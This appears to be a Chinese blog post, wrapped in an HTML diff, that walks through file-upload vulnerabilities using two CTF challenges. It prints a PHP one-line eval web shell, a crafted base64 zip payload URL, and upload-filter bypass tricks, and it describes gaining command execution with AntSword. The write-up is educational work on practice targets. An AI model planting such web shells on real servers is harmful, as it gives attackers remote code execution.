@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="文件上传漏洞原理1程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全  这次演示就是让大家了解到这个文件上传的危害，以及让大家知">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="文件上传漏洞原理1程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全  这次演示就是让大家了解到这个文件上传的危害，以及让大家知">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231017170845248.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017171223384.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017171912861.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017172037322.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017172403348.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017172538819.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017174306890.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017174405932.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017175218398.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231018101016981.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231018101544865.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019171236931.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231018140631831.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019172612998.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019173032780.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019173821171.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019173933236.png">
+<meta property="article:published_time" content="2022-08-10T12:55:49.000Z">
+<meta property="article:modified_time" content="2026-05-25T12:56:57.018Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231017170845248.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>文件上传 | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+<!-- mathjax -->
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']],
+        displayMath: [['$$','$$'], ['\[','\]']]
+      }
+    });
+  </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/09/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&text=文件上传"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&is_video=false&description=文件上传"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=文件上传&body=Check out this article: https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&title=文件上传"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&name=文件上传&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/08/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&t=文件上传"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-file-master"><span class="toc-number">1.2.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]file_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">1.3.</span> <span class="toc-text">[鹏城杯 2022]压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        文件上传
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2022-08-10T12:55:49.000Z" class="dt-published" itemprop="datePublished">2022-08-10</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全</span><br></pre></td></tr></table></figure>
+
+<p>这次演示就是让大家了解到这个文件上传的危害，以及让大家知道一些文件上传的利用方式和防护手法。如果大家想要更一步学习文件上传可以将<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E6%94%BE%E5%88%B0phpstudy%E7%9A%84www%E4%B8%8B%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95%E3%80%82">https://github.com/c0ny1/upload-labs，这个靶场下载下来放到phpstudy的www下进行测试。</a></p>
+<h3 id="SWPUCTF-2022-新生赛-file-master"><a href="#SWPUCTF-2022-新生赛-file-master" class="headerlink" title="[SWPUCTF 2022 新生赛]file_master"></a>[SWPUCTF 2022 新生赛]file_master</h3><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3085">SWPUCTF 2022 新生赛]file_master | NSSCTF</a></p>
+<p>这个题的考察是限制图片的大小，我们可以更改图片大小来解决这个问题，主要还是来说就是解决文件可以上传的。这个题比较基础。</p>
+<p>可以更好的帮助大家理解。</p>
+<p>我们点开页面发现可以上传文件我们随便上传一个木马上去看看</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20231017170845248.png" alt="image-20231017170845248"></p>
+<p>上面要求我们上传jpeg文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017171223384.png" alt="image-20231017171223384"></p>
+<p>我们上传这个文件的时候提示文件提示文件头无效！加上GIF89a:</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017171912861.png" alt="image-20231017171912861"></p>
+<p>我们在加入文件头的时候他又去提示了图片高度和宽度不要超过20，这个时候我们要在文件中部分修改文件高度和宽度不高于20</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017172037322.png" alt="image-20231017172037322"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define height 1</span><br><span class="line">#define width 1</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们修改了文件宽度和高度还是不行，是因为我们应该将GIF89a文件头去掉然后再次上传发现上传还是失败应该是什么被过滤了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017172403348.png" alt="image-20231017172403348"></p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017172538819.png" alt="image-20231017172538819"></p>
+<p>这个时候我们去掉php这个标签进行，短标签去试试，让我们试成功了这个时候我们可以命令执行也知道了文件路径去用蚁剑连接</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017174306890.png" alt="image-20231017174306890"></p>
+<p>蚁剑连接，这个中sessionid为你的phpsessid的值后面说你的文件名</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017174405932.png" alt="image-20231017174405932"></p>
+<p>我们进入命令行中来查看得到flag，因为我们没有直接查看的权力，这个时候我们也就获得flag，这个题主要帮助大家学习</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231017175218398.png" alt="image-20231017175218398"></p>
+<h3 id="鹏城杯-2022-压缩包"><a href="#鹏城杯-2022-压缩包" class="headerlink" title="[鹏城杯 2022]压缩包"></a>[鹏城杯 2022]压缩包</h3><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2421">鹏城杯 2022]压缩包 | NSSCTF</a></p>
+<p>这个题主要考的是文件上传的条件竞争，这个意思是在我们上传文件的时候他的后端会删除我们的上传文件，但是他删除是有时间的，我们通过大量的上传文件从而达到让服务器删除不过来，从而达到上传的目的。在这一题中我们用的是通过在linux中压缩包的原理和文件的命名规则来实现了文件的上传</p>
+<p>这个点开就看到了源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">function removedir($dir)&#123;</span><br><span class="line">    $list= scandir($dir);</span><br><span class="line">    foreach ($list as  $value) &#123;</span><br><span class="line">       if(is_file($dir.&#x27;/&#x27;.$value))&#123;</span><br><span class="line">         unlink($dir.&#x27;/&#x27;.$value);</span><br><span class="line">       &#125;else if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;</span><br><span class="line">                removedir($dir.&#x27;/&#x27;.$value);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function unzip($filename)&#123;</span><br><span class="line">        $result = [];</span><br><span class="line">        $zip = new ZipArchive();</span><br><span class="line">        $zip-&gt;open($filename);</span><br><span class="line">        $dir = $_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&quot;/static/upload/&quot;.md5($filename);</span><br><span class="line">        if(!is_dir($dir))&#123;</span><br><span class="line">            mkdir($dir);</span><br><span class="line">        &#125;</span><br><span class="line">        if($zip-&gt;extractTo($dir))&#123;</span><br><span class="line">        foreach (scandir($dir) as  $value) &#123;</span><br><span class="line">            $file_ext=strrchr($value, &#x27;.&#x27;);</span><br><span class="line">            $file_ext=strtolower($file_ext); //转换为小写</span><br><span class="line">            $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">            $file_ext=trim($file_ext); //收尾去空</span><br><span class="line">            if(is_dir($dir.&quot;/&quot;.$value)&amp;&amp;$value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)&#123;</span><br><span class="line">                removedir($dir);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!preg_match(&quot;/jpg|png|gif|jpeg/is&quot;,$file_ext))&#123;</span><br><span class="line">                if(is_file($dir.&quot;/&quot;.$value))&#123;</span><br><span class="line">                    unlink($dir.&quot;/&quot;.$value);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    if($value!=&quot;.&quot;&amp;&amp;$value!=&quot;..&quot;)</span><br><span class="line">                    array_push($result,$value);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        $zip-&gt;close();</span><br><span class="line">        unlink($filename);</span><br><span class="line">        return json_encode($result);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$content= $_REQUEST[&#x27;content&#x27;];</span><br><span class="line">shell_exec(&#x27;rm -rf /tmp/*&#x27;);</span><br><span class="line">$fpath =&quot;/tmp/&quot;.md5($content); </span><br><span class="line">file_put_contents($fpath, base64_decode($content));</span><br><span class="line">echo unzip($fpath);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ol>
+<li><code>highlight_file(__FILE__);</code>：这一行代码用于在当前页面显示当前PHP文件的源代码，以便查看代码内容。</li>
+<li><code>function removedir($dir)</code>：这是一个自定义的PHP函数，用于递归地删除指定目录及其子目录中的文件和文件夹。它接受一个目录路径作为参数，并遍历目录中的内容，将文件删除，同时递归地调用自身来删除子目录。</li>
+<li><code>function unzip($filename)</code>：这是另一个自定义函数，用于解压缩指定的ZIP文件。它首先创建一个目标目录，然后使用PHP的ZipArchive类打开ZIP文件，并将其内容解压缩到目标目录中。在解压缩过程中，它还过滤掉不符合条件的文件（文件扩展名不是jpg、png、gif、jpeg的文件），并返回剩余文件的列表。如果解压缩成功，它返回包含文件列表的JSON字符串，否则返回false。</li>
+<li><code>$content= $_REQUEST[&#39;content&#39;];</code>：这行代码从HTTP请求中获取名为’content’的参数，该参数应该包含经过base64编码的ZIP文件内容。</li>
+<li><code>shell_exec(&#39;rm -rf /tmp/*&#39;);</code>：这行代码使用<code>shell_exec</code>函数在服务器上执行一个Shell命令，该命令删除<code>/tmp/</code>目录下的所有文件和子目录。这是为了清理之前的临时文件，以便存储新的ZIP文件。</li>
+<li><code>$fpath =&quot;/tmp/&quot;.md5($content);</code>：这行代码创建一个临时文件路径，文件名是基于$content的MD5散列值，文件保存在<code>/tmp/</code>目录下。</li>
+<li><code>file_put_contents($fpath, base64_decode($content));</code>：这行代码将经过base64解码的ZIP文件内容写入上述创建的临时文件。</li>
+<li><code>echo unzip($fpath);</code>：最后，这行代码调用unzip函数，尝试解压缩临时文件，并返回剩余文件的JSON字符串，然后将其输出到浏览器</li>
+</ol>
+</blockquote>
+<p>这个意思就是我们将我们上传的内容写到&#x2F;tmp下，接着作为压缩包解压，然后经过一堆过滤后如果不满足则删除文件，这个时候我们可以将压缩包</p>
+<p>将压缩包中设置为两个文件一个为木马文件一个为普通文件这个时候我们将普通文件修改为&#x2F;&#x2F;&#x2F;&#x2F;这个时候我们linux中是不解析这个文件的。木马文件内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231018101016981.png" alt="image-20231018101016981"></p>
+<p>这个时候我们将用010 edior修改一下1.txt的文件名为&#x2F;&#x2F;&#x2F;&#x2F;，因为这个时候我们windows也是不可以进行设置的</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231018101544865.png"></p>
+<p>我们将这个文件名1.txt修改为&#x2F;&#x2F;&#x2F;&#x2F;这个时候就不可以进行,这个时候我们上传zip文件后就会解压里面的文件，因为这个时候我们1.txt文件改为了&#x2F;&#x2F;&#x2F;&#x2F;而linux服务器不可以解析这个文件导致解压失败但这个时候我们的php文件已经解压出来了。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019171236931.png" alt="image-20231019171236931"></p>
+<p>这里我们可以看到这个是base64解密的，然后我们要用base64加密去传参。</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231018140631831.png" alt="image-20231018140631831"></p>
+<p>我们现在就是要将压缩包进行base64加密保存到1.txt中去最后在1.txt中得到了base64编码的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 读取压缩包文件</span><br><span class="line">input_file = &#x27;1.zip&#x27;</span><br><span class="line">with open(input_file, &#x27;rb&#x27;) as f:</span><br><span class="line">    compressed_data = f.read()</span><br><span class="line"></span><br><span class="line"># 使用base64编码</span><br><span class="line">base64_encoded = base64.b64encode(compressed_data)</span><br><span class="line"></span><br><span class="line"># 将编码后的数据保存到文件</span><br><span class="line">output_file = &#x27;1.txt&#x27;</span><br><span class="line">with open(output_file, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(base64_encoded)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们进行传参后给出了文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28397/?content=UEsDBBQAAAAAACyHU1c9NLMMHQAAAB0AAAAFAAAAMS5waHA8P3BocCBAZXZhbCgkX1BPU1RbJ2EnXSk7Pz4NClBLAwQUAAAACACVUVJX7AJCixYAAAAWAAAABQAAAC8vLy8vK05MSUsrBhIp2eUp2WkZ5YnFaRlZAFBLAQIUABQAAAAAACyHU1c9NLMMHQAAAB0AAAAFAAAAAAAAAAAAIAAAAAAAAAAxLnBocFBLAQIUABQAAAAIAJVRUlfsAkKLFgAAABYAAAAFACQAAAAAAAAAIAAAAEAAAAAvLy8vLwoAIAAAAAAAAQAYAHVcc5JoAdoBszY9n2gB2gGs7AiKaAHaAVBLBQYAAAAAAgACAIoAAAB5AAAAAAA%3D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019172612998.png" alt="image-20231019172612998"></p>
+<p>这个时候给出了我们的文件路径，&#x2F;static&#x2F;upload&#x2F;42854ddd840494e70d60707d2d81a1d5&#x2F;，然后我们在这个路径上访问1.php文件</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019173032780.png" alt="image-20231019173032780"></p>
+<p>我们这时候使用蚁剑连接就可以成功，然后我们使用蚁剑连接密码是a.这个密码是我们一句话的那个参数</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019173821171.png" alt="image-20231019173821171"></p>
+<p>进去后我们在根目录下发现了flag</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231019173933236.png" alt="image-20231019173933236"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>文件上传上面只是两个简单的例子我们主要还是要用一些不一样的来实现文件上传，然后如果你后续还想进行学习可以将upload-labs这个靶场来进行打一下回顾一下这样的话可以更好的学习下来。文件上传相对来说比较简单大家可以在课下多多练习。</p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-file-master"><span class="toc-number">1.2.</span> <span class="toc-text">[SWPUCTF 2022 新生赛]file_master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">1.3.</span> <span class="toc-text">[鹏城杯 2022]压缩包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
